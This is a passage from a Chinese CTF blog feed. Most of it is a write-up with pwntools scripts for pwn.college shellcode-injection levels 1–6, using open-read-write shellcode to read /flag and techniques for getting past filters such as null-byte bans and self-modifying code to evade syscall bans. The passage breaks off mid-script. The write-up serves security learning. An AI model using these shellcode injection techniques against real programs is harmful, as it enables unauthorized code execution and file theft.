i8,</span><br><span class="line">                                                                    i9,</span><br><span class="line">                                                                    ia,</span><br><span class="line">                                                                    ib,</span><br><span class="line">                                                                    ic,</span><br><span class="line">                                                                    <span class="built_in">id</span>,</span><br><span class="line">                                                                    ie,</span><br><span class="line">                                                                    iff,</span><br><span class="line">                                                                    i10,</span><br><span class="line">                                                                ]</span><br><span class="line">                                                                aes = AES.new(key=<span class="built_in">bytes</span>(key), mode=AES.MODE_ECB)</span><br><span class="line">                                                                p1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D47D8FE192A9605A5E8EDCADE2DBBEDC&quot;</span>)</span><br><span class="line">                                                                flag = aes.decrypt(p1)</span><br><span class="line">                                                                <span class="keyword">if</span> flag.startswith(<span class="string">b&quot;flag&#123;&quot;</span>):</span><br><span class="line">                                                                    p1 = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">                                                                        <span class="string">&quot;D47D8FE192A9605A5E8EDCADE2DBBEDC9E103EBAF7DB72DAF73367D9FA13043F680D89FE7399908919E4530E3EC8C3D0&quot;</span></span><br><span class="line">                                                                    )</span><br><span class="line">                                                                    flag = aes.decrypt(p1)</span><br><span class="line">                                                                    <span class="built_in">print</span>(flag)</span><br><span class="line">                                                                    exit()</span><br></pre></td></tr></table></figure>
<h3 id="rpc"><a class="markdownIt-Anchor" href="#rpc">#</a> RPC</h3>
<p>golangRPC，加密套娃玩意</p>
<p>main__ptr_S_A 是加密，python tcp 协议按顺序传一下包即可调试</p>
<p><img loading="lazy" data-src="tctf/image-20231208195637621.png" alt="image-20231208195637621"></p>
<p>然后就是加密套娃</p>
]]></content>
  </entry>
  <entry>
    <title>shellcodeORW</title>
    <url>/2024/03/05/shellcodeORW/</url>
    <content><![CDATA[<h6 id="preface-pwncollege的shellcode-injection算是一个小入门~"><a class="markdownIt-Anchor" href="#preface-pwncollege的shellcode-injection算是一个小入门~">#</a> PREFACE: pwn.college 的 shellcode injection，算是一个小入门～</h6>
<span id="more"></span>
<!-- 看了眼discord，不许开writeup，就隐藏了：> -->
<h3 id="level-1"><a class="markdownIt-Anchor" href="#level-1">#</a> level 1</h3>
<p>basic orw：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// close:</span></span><br><span class="line"><span class="string">    mov rdi, 2</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    mov rbx, 0x<span class="subst">&#123;flag_file&#125;</span></span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read:</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// exit:</span></span><br><span class="line"><span class="string">    mov rax, 0x3c</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="comment"># print(hex_shellcode)</span></span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level1_chall&#x27;</span>,<span class="string">&#x27;b *main + 560\nb *main + 709&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-2"><a class="markdownIt-Anchor" href="#level-2">#</a> level 2</h3>
<p>随机跳一段，全 nop 即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// close:</span></span><br><span class="line"><span class="string">    mov rdi, 2</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    mov rbx, 0x<span class="subst">&#123;flag_file&#125;</span></span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read:</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// exit:</span></span><br><span class="line"><span class="string">    mov rax, 0x3c</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="comment"># print(hex_shellcode)</span></span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level2_chall&#x27;</span>,<span class="string">&#x27;b *main + 910&#x27;</span>)</span><br><span class="line"><span class="comment"># while (True):</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;./level2_chall&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(&#x27;Reading 0x1000 bytes from stdin.\n&#x27;,0x700 * b&#x27;\90&#x27; + hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     # p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     if (b&#x27;flag&#x27; in p.recv()):</span></span><br><span class="line"><span class="comment">#         print(p.recv())</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     p.close()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,<span class="number">0x700</span> * <span class="string">b&#x27;\x90&#x27;</span> + hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-3"><a class="markdownIt-Anchor" href="#level-3">#</a> level 3</h3>
<p>禁用 <code>\x00</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// close:</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov dil, 2</span></span><br><span class="line"><span class="string">    mov al, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    sub rsp, 5</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp], 0x2f</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+1], 0x66</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+2], 0x6c</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+3], 0x61</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+4], 0x67</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    sub byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read:    </span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov dl, 0x50</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">// exit:</span></span><br><span class="line"><span class="string">    mov al, 0x3c</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="comment"># print(hex_shellcode)</span></span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level2_chall&#x27;</span>,<span class="string">&#x27;b *main + 910&#x27;</span>)</span><br><span class="line"><span class="comment"># while (True):</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;./level2_chall&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(&#x27;Reading 0x1000 bytes from stdin.\n&#x27;,0x700 * b&#x27;\90&#x27; + hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     # p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     if (b&#x27;flag&#x27; in p.recv()):</span></span><br><span class="line"><span class="comment">#         print(p.recv())</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     p.close()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,<span class="number">0x700</span> * <span class="string">b&#x27;\x90&#x27;</span> + hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-4"><a class="markdownIt-Anchor" href="#level-4">#</a> level 4</h3>
<p>ban ‘H’，不能用 xor 和 mov 等，用 push pop 代替赋值即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// close:</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov dil, 2</span></span><br><span class="line"><span class="string">    mov al, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp], 0x2f</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+1], 0x66</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+2], 0x6c</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+3], 0x61</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+4], 0x67</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    sub byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">// read:    </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    mov dl, 0x50</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">// exit:</span></span><br><span class="line"><span class="string">    mov al, 0x3c</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="comment"># print(hex_shellcode)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./level2_chall&#x27;,&#x27;b *main + 910&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyshell_level4&#x27;</span>)</span><br><span class="line"><span class="comment"># while (True):</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;./level2_chall&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendafter(&#x27;Reading 0x1000 bytes from stdin.\n&#x27;,0x700 * b&#x27;\90&#x27; + hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     # p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#     print(p.recv())</span></span><br><span class="line"><span class="comment">#     if (b&#x27;flag&#x27; in p.recv()):</span></span><br><span class="line"><span class="comment">#         print(p.recv())</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     p.close()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,<span class="number">0x700</span> * <span class="string">b&#x27;\x90&#x27;</span> + hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># p.recv()</span></span><br></pre></td></tr></table></figure>
<h3 id="level-5"><a class="markdownIt-Anchor" href="#level-5">#</a> level 5</h3>
<p>ban syscall 等，得 smc 拿（代码写复杂了，可以直接获取 rip 的，不过一时没想起来就用了他的 leak 来找地址）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./level5_chall&#x27;,&#x27;b *main\nb *main + 873&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./level5_chall&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] Mapping shellcode memory at &#x27;</span>)</span><br><span class="line">leak_addr = p.recvn(<span class="number">10</span>).decode()</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close</span></span><br><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">shellcode_close = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    mov dil, 2</span></span><br><span class="line"><span class="string">    mov al, 3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_close = asm(shellcode_close)</span><br><span class="line">shellcode += shellcode_close</span><br><span class="line">syscall = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">syscall = asm(syscall)</span><br><span class="line">after_syscall = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="string">b&#x27;\x90\x90&#x27;</span>, syscall))</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rbx, 0x0067616c662f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_open = asm(shellcode_open)</span><br><span class="line">shellcode += shellcode_open</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov al, 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_read = asm(shellcode_read)</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_write = asm(shellcode_write)</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line">shellcode_exit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_exit = asm(shellcode_exit)</span><br><span class="line">shellcode += shellcode_exit</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"><span class="comment"># print(&#x27;--------------------------------------&#x27;)</span></span><br><span class="line"><span class="comment"># print(disasm(shellcode))</span></span><br><span class="line"><span class="comment"># print(&#x27;--------------------------------------&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-6"><a class="markdownIt-Anchor" href="#level-6">#</a> level 6</h3>
<p>比起上一题多了禁用前 0x1000 的 write，不过长度够可以直接绕</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rept 0x1000</span><br><span class="line">  nop</span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>],log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level6_chall&#x27;</span>,<span class="string">&#x27;b *main\nb *main + 957\nb *main + 525&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./level6_chall&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] Mapping shellcode memory at &#x27;</span>)</span><br><span class="line">leak_addr = p.recvn(<span class="number">10</span>).decode()</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.rept 0x1000</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">.endr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">shellcode_close = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    